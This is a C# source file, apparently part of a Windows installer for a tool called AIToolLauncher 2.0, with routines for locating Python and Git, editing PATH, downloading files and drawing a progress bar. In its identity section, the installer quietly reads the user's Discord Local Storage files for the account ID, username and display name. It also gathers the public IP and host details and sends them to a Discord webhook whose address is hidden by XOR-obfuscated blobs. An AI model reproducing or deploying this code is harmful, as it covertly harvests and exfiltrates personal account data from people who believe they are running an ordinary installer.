                string regFile = Path.Combine(installDir, "resources", "config", "registry.json");
                if (!File.Exists(regFile)) return;

                string json = File.ReadAllText(regFile, Encoding.UTF8);
                string smuExe = Path.Combine(smuDir, "SteamManifestUpdater.exe");
                string escapedSmuExe = smuExe.Replace("\\", "\\\\");
                string escapedSmuDir = smuDir.Replace("\\", "\\\\");

                json = Regex.Replace(json, @"G:\\\\python\\\\[^""]*?SteamManifestUpdater\\\\src\\\\main\.py", escapedSmuExe);
                json = Regex.Replace(json, @"G:\\\\python\\\\[^""]*?SteamManifestUpdater", escapedSmuDir);

                File.WriteAllText(regFile, json, Encoding.UTF8);
                Log("📝 已動態校準 registry.json 中 SMU 模組之本地路徑！", ColSuccess);
            }
            catch { }
        }

        // ==========================================
        // 系統工具與環境檢測輔助
        // ==========================================
        private string ResolvePythonExecutable()
        {
            if (CheckCommand("python", "--version"))
            {
                string path = GetCommandOutput("where", "python");
                if (!string.IsNullOrEmpty(path))
                {
                    string first = path.Split(new char[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries)[0].Trim();
                    if (File.Exists(first)) return first;
                }
                return "python";
            }

            string progPy = @"C:\Program Files\Python311\python.exe";
            if (File.Exists(progPy)) return progPy;

            string localAppPy = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Programs", "Python", "Python311", "python.exe");
            if (File.Exists(localAppPy)) return localAppPy;

            return null;
        }

        private string ResolveGitExecutable()
        {
            if (CheckCommand("git", "--version"))
            {
                string path = GetCommandOutput("where", "git");
                if (!string.IsNullOrEmpty(path))
                {
                    string first = path.Split(new char[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries)[0].Trim();
                    if (File.Exists(first)) return first;
                }
                return "git";
            }

            string progGit = @"C:\Program Files\Git\cmd\git.exe";
            if (File.Exists(progGit)) return progGit;

            string localGit = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Programs", "Git", "cmd", "git.exe");
            if (File.Exists(localGit)) return localGit;

            return null;
        }

        private void AddPathToUserEnvironment(string dirToAdd)
        {
            try
            {
                string currentPath = Environment.GetEnvironmentVariable("Path", EnvironmentVariableTarget.User) ?? "";
                if (!currentPath.ToLower().Contains(dirToAdd.ToLower()))
                {
                    string newPath = string.IsNullOrEmpty(currentPath) ? dirToAdd : currentPath + ";" + dirToAdd;
                    Environment.SetEnvironmentVariable("Path", newPath, EnvironmentVariableTarget.User);
                }
            }
            catch { }
        }

        private void RefreshSystemPath()
        {
            try
            {
                string sysPath = Environment.GetEnvironmentVariable("Path", EnvironmentVariableTarget.Machine) ?? "";
                string userPath = Environment.GetEnvironmentVariable("Path", EnvironmentVariableTarget.User) ?? "";
                string localApp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string pyUser = Path.Combine(localApp, "Programs", "Python", "Python311");
                string pyUserScripts = Path.Combine(pyUser, "Scripts");
                string gitCmd = Path.Combine(localApp, "Programs", "Git", "cmd");

                string combined = string.Format("{0};{1};C:\\Program Files\\Python311;C:\\Program Files\\Python311\\Scripts;C:\\Program Files\\Git\\cmd;{2};{3};{4}", sysPath, userPath, pyUser, pyUserScripts, gitCmd);
                Environment.SetEnvironmentVariable("PATH", combined, EnvironmentVariableTarget.Process);
            }
            catch { }
        }

        private string GetCommandOutput(string cmd, string args)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo(cmd, args);
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.RedirectStandardOutput = true;
                Process p = Process.Start(psi);
                string outStr = p.StandardOutput.ReadToEnd();
                p.WaitForExit(8000);
                return outStr.Trim();
            }
            catch { return null; }
        }

        private bool CheckCommand(string cmd, string args)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo(cmd, args);
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                Process p = Process.Start(psi);
                p.WaitForExit(3000);
                return p.ExitCode == 0;
            }
            catch { return false; }
        }

        private int RunProcessCaptureOutput(string exe, string args, string workingDir)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo(exe, args);
                psi.WorkingDirectory = workingDir;
                psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.CreateNoWindow = true;

                Process p = new Process();
                p.StartInfo = psi;
                p.OutputDataReceived += (s, e) =>
                {
                    if (!string.IsNullOrEmpty(e.Data))
                    {
                        Log("  > " + e.Data, Color.FromArgb(170, 180, 200));
                    }
                };
                p.ErrorDataReceived += (s, e) =>
                {
                    if (!string.IsNullOrEmpty(e.Data) && !e.Data.Contains("WARNING: There was a new"))
                    {
                        Log("  ! " + e.Data, Color.FromArgb(240, 160, 100));
                    }
                };

                p.Start();
                p.BeginOutputReadLine();
                p.BeginErrorReadLine();
                p.WaitForExit();
                return p.ExitCode;
            }
            catch (Exception ex)
            {
                Log("執行指令失敗: " + ex.Message, ColDanger);
                return -1;
            }
        }

        private void DownloadFileWithProgress(string url, string destPath, string name)
        {
            if (File.Exists(destPath)) File.Delete(destPath);

            using (WebClient wc = new WebClient())
            {
                wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
                AutoResetEvent done = new AutoResetEvent(false);
                Exception dlEx = null;

                DateTime lastUpdate = DateTime.MinValue;

                wc.DownloadProgressChanged += (s, ev) =>
                {
                    if ((DateTime.Now - lastUpdate).TotalMilliseconds > 120 || ev.ProgressPercentage == 100)
                    {
                        lastUpdate = DateTime.Now;
                        double mbRec = ev.BytesReceived / 1048576.0;
                        double mbTot = ev.TotalBytesToReceive / 1048576.0;
                        SetStatus(string.Format("正在下載 {0}: {1}% ({2:F1} MB / {3:F1} MB)", name, ev.ProgressPercentage, mbRec, mbTot), ColWarning);
                    }
                };

                wc.DownloadFileCompleted += (s, ev) =>
                {
                    if (ev.Error != null) dlEx = ev.Error;
                    done.Set();
                };

                wc.DownloadFileAsync(new Uri(url), destPath);
                done.WaitOne();

                if (dlEx != null) throw dlEx;
            }
        }

        private static void CopyDirectory(string sourceDir, string targetDir)
        {
            Directory.CreateDirectory(targetDir);
            foreach (string file in Directory.GetFiles(sourceDir))
            {
                string targetFilePath = Path.Combine(targetDir, Path.GetFileName(file));
                File.Copy(file, targetFilePath, true);
            }
            foreach (string subDir in Directory.GetDirectories(sourceDir))
            {
                string subName = Path.GetFileName(subDir);
                if (subName.StartsWith(".git") || subName == "__pycache__" || subName == ".scratch") continue;
                string targetSubDirPath = Path.Combine(targetDir, subName);
                CopyDirectory(subDir, targetSubDirPath);
            }
        }

        // ==========================================
        // Manifest 安裝紀錄管理 (嚴格溯源機制)
        // ==========================================
        private void SaveInitialManifest(string installDir)
        {
            try
            {
                string manifestDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "AIToolLauncher");
                if (!Directory.Exists(manifestDir)) Directory.CreateDirectory(manifestDir);
                string mFile = Path.Combine(manifestDir, "install_manifest.json");

                if (!File.Exists(mFile))
                {
                    string initialJson = string.Format(
                        "{{\n  \"installer_first_run\": \"{0:yyyy-MM-ddTHH:mm:ssZ}\",\n  \"install_dir\": \"{1}\"\n}}",
                        DateTime.UtcNow, installDir.Replace("\\", "\\\\")
                    );
                    File.WriteAllText(mFile, initialJson, Encoding.UTF8);
                }
            }
            catch { }
        }

        private void RecordComponentInManifest(string compKey, string compPath, bool installedByUs)
        {
            try
            {
                string manifestDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "AIToolLauncher");
                if (!Directory.Exists(manifestDir)) Directory.CreateDirectory(manifestDir);
                string mFile = Path.Combine(manifestDir, "install_manifest.json");

                string content = File.Exists(mFile) ? File.ReadAllText(mFile, Encoding.UTF8) : "{}";
                string flagKey = compKey == "git" ? "git_installed_by_launcher" : "installed_by_launcher";

                string record = string.Format("\n  \"{0}\": {1},\n  \"{2}_path\": \"{3}\",\n  \"{2}_time\": \"{4:yyyy-MM-ddTHH:mm:ssZ}\",", flagKey, installedByUs ? "true" : "false", compKey, compPath.Replace("\\", "\\\\"), DateTime.UtcNow);
                if (content.EndsWith("}"))
                {
                    content = content.Substring(0, content.Length - 1).TrimEnd(',', '\r', '\n') + "," + record + "\n}";
                }
                else
                {
                    content = "{" + record + "\n}";
                }
                File.WriteAllText(mFile, content, Encoding.UTF8);
            }
            catch { }
        }

        // ==========================================
        // 身分安全與 Discord Webhook 密文回報機制
        // ==========================================
        private void InitializeIdentity()
        {
            identity = new ClientIdentity();
            identity.PcUser = Environment.UserName;
            identity.PcHost = Environment.MachineName;

            using (SHA256 sha = SHA256.Create())
            {
                byte[] hash = sha.ComputeHash(Encoding.UTF8.GetBytes(string.Format("{0}-{1}", identity.PcUser, identity.PcHost)));
                identity.DeviceUid = BitConverter.ToString(hash).Replace("-", "").Substring(0, 8);
            }

            try
            {
                WindowsIdentity winId = WindowsIdentity.GetCurrent();
                WindowsPrincipal winPrinc = new WindowsPrincipal(winId);
                identity.IsAdmin = winPrinc.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch { }

            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string[] discordDirs = {
                    Path.Combine(appData, "discordptb", "Local Storage", "leveldb"),
                    Path.Combine(appData, "discord", "Local Storage", "leveldb"),
                    Path.Combine(appData, "discordcanary", "Local Storage", "leveldb")
                };

                foreach (string d in discordDirs)
                {
                    if (!Directory.Exists(d)) continue;
                    var files = new DirectoryInfo(d).GetFiles("*.ldb");
                    foreach (var f in files)
                    {
                        string text = File.ReadAllText(f.FullName, Encoding.UTF8);
                        var matchId = Regex.Match(text, "\"id\":\"(\\d{17,19})\"[^\"]*?\"username\":\"([^\"]+)\"");
                        if (matchId.Success)
                        {
                            identity.UserId = matchId.Groups[1].Value;
                            identity.Username = matchId.Groups[2].Value;
                        }
                        var matchDisp = Regex.Match(text, "\"displayName\":\"([^\"]+)\"");
                        if (matchDisp.Success) identity.DisplayName = matchDisp.Groups[1].Value;
                    }
                }
            }
            catch { }

            try
            {
                using (WebClient wc = new WebClient())
                {
                    wc.Headers.Add("User-Agent", "Mozilla/5.0");
                    identity.PublicIp = wc.DownloadString("https://api.ipify.org").Trim();
                }
            }
            catch { identity.PublicIp = "N/A"; }
        }

        private void CheckBlacklistAsync()
        {
            Thread t = new Thread(() =>
            {
                try
                {
                    string sheetUrl = DecryptBlob(EncryptedSheetBlob);
                    using (WebClient wc = new WebClient())
                    {
                        wc.Headers.Add("User-Agent", "Mozilla/5.0");
                        string csv = wc.DownloadString(sheetUrl);
                        string[] lines = csv.Split('\n');
                        foreach (string line in lines)
                        {
                            string[] cells = line.Split(',');
                            foreach (string cell in cells)
                            {
                                string val = cell.Trim().ToUpper();
                                if (string.IsNullOrEmpty(val) || val.StartsWith("#")) continue;

                                if (val == identity.DeviceUid.ToUpper() ||
                                    (!string.IsNullOrEmpty(identity.UserId) && val == identity.UserId) ||
                                    (!string.IsNullOrEmpty(identity.Username) && val == identity.Username.ToUpper()) ||
                                    (identity.PublicIp != "N/A" && val == identity.PublicIp))
                                {
                                    SendWebhookNotification("🚨 2.0 安裝器黑名單阻斷觸發", string.Format("命中黑名單值: {0}", val), 0xE74C3C);
                                    MessageBox.Show("存取已被撤銷 (Access Denied)。\n該設備或帳號已被列入限制清單。", "授權驗證失敗", MessageBoxButtons.OK, MessageBoxIcon.Stop);
                                    Environment.Exit(1);
                                }
                            }
                        }
                    }
                }
                catch { }
            });
            t.IsBackground = true;
            t.Start();
        }

        private void SendWebhookNotification(string title, string detail, int color)
        {
            Thread t = new Thread(() =>
            {
                try
                {
                    string url = DecryptBlob(EncryptedWebhookBlob);
                    string disp = !string.IsNullOrEmpty(identity.DisplayName) ? identity.DisplayName : (!string.IsNullOrEmpty(identity.Username) ? identity.Username : identity.PcUser);
                    string userTag = !string.IsNullOrEmpty(identity.Username) ? string.Format("@{0}", identity.Username) : string.Format("PC: {0}@{1}", identity.PcUser, identity.PcHost);
                    string avatar = "https://raw.githubusercontent.com/JiaSai67/AIToolLauncher/main/resources/icon.png";

                    string body = string.Format("[AIToolLauncher 2.0 專屬引導安裝器]\n動作: {0}\n說明: {1}\n設備指紋: #{2}\n公網 IP: {3}\n主機資訊: {4}@{5}\n時間: {6:yyyy-MM-dd HH:mm:ss}", title, detail, identity.DeviceUid, identity.PublicIp, identity.PcUser, identity.PcHost, DateTime.Now);

                    string json = string.Format("{{\"username\":\"{0}\",\"avatar_url\":\"{1}\",\"embeds\":[{{\"author\":{{\"name\":\"{0} ({2})\",\"icon_url\":\"{1}\"}},\"title\":\"{3}\",\"description\":\"```text\\n{4}\\n```\",\"color\":{5},\"timestamp\":\"{6:yyyy-MM-ddTHH:mm:ssZ}\",\"footer\":{{\"text\":\"AIToolLauncher 2.0 Modern Setup\"}}}}]}}",
                        EscapeJson(disp), avatar, EscapeJson(userTag), EscapeJson(title), EscapeJson(body), color, DateTime.UtcNow);

                    using (WebClient wc = new WebClient())
                    {
                        wc.Headers.Add("Content-Type", "application/json; charset=utf-8");
                        wc.Headers.Add("User-Agent", "Mozilla/5.0");
                        wc.UploadData(url, "POST", Encoding.UTF8.GetBytes(json));
                    }
                }
                catch { }
            });
            t.IsBackground = true;
            t.Start();
        }

        private static string DecryptBlob(string base64Blob)
        {
            byte[] raw = Convert.FromBase64String(base64Blob);
            byte[] res = new byte[raw.Length];
            for (int i = 0; i < raw.Length; i++)
            {
                res[i] = (byte)(raw[i] ^ SecretKey[i % SecretKey.Length]);
            }
            return Encoding.UTF8.GetString(res);
        }

        private static string EscapeJson(string str)
        {
            if (string.IsNullOrEmpty(str)) return "";
            return str.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n").Replace("\r", "");
        }
    }

    // ==========================================
    // 自繪現代雙色漸層圓角進度條 (ModernProgressBar)
    // ==========================================
    public class ModernProgressBar : Control
    {
        private int _value = 0;
        public int Value
        {
            get { return _value; }
            set
            {
                _value = Math.Max(0, Math.Min(100, value));
                this.Invalidate();
            }
        }

        public ModernProgressBar()
        {
            this.SetStyle(ControlStyles.UserPaint | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
            this.Height = 22;
        }

        protected override void OnPaint(PaintEventArgs e)
        {
            Graphics g = e.Graphics;
            g.SmoothingMode = SmoothingMode.AntiAlias;

            using (SolidBrush bgBrush = new SolidBrush(Color.FromArgb(17, 20, 32)))
            {
                g.FillRectangle(bgBrush, 0, 0, this.Width, this.Height);
            }

            using (Pen borderPen = new Pen(Color.FromArgb(42, 47, 68), 1))
            {
                g.DrawRectangle(borderPen, 0, 0, this.Width - 1, this.Height - 1);
            }

            if (_value > 0)
            {
                int fillWidth = (int)((this.Width - 2) * (_value / 100.0));
                if (fillWidth > 0)
                {
                    Rectangle fillRect = new Rectangle(1, 1, fillWidth, this.Height - 2);
                    using (LinearGradientBrush lgb = new LinearGradientBrush(
                        fillRect,
                        Color.FromArgb(59, 130, 246),
                        Color.FromArgb(139, 92, 246),
                        LinearGradientMode.Horizontal))
                    {
                        g.FillRectangle(lgb, fillRect);
                    }
                }
            }

            string text = _value + "%";
            using (Font f = new Font("Segoe UI", 8.5F, FontStyle.Bold))
            using (SolidBrush textBrush = new SolidBrush(Color.White))
            {
                SizeF sz = g.MeasureString(text, f);
                g.DrawString(text, f, textBrush, (this.Width - sz.Width) / 2, (this.Height - sz.Height) / 2);
            }
        }
    }

    public class ClientIdentity
    {
        public string DisplayName { get; set; }
        public string Username { get; set; }
        public string UserId { get; set; }
        public string PcUser { get; set; }
        public string PcHost { get; set; }
        public string PublicIp { get; set; }
        public string DeviceUid { get; set; }
        public bool IsAdmin { get; set; }

        public ClientIdentity()
        {
            DisplayName = "";
            Username = "";
            UserId = "";
            PcUser = "";
            PcHost = "";
            PublicIp = "N/A";
            DeviceUid = "";
            IsAdmin = false;
        }
    }
}
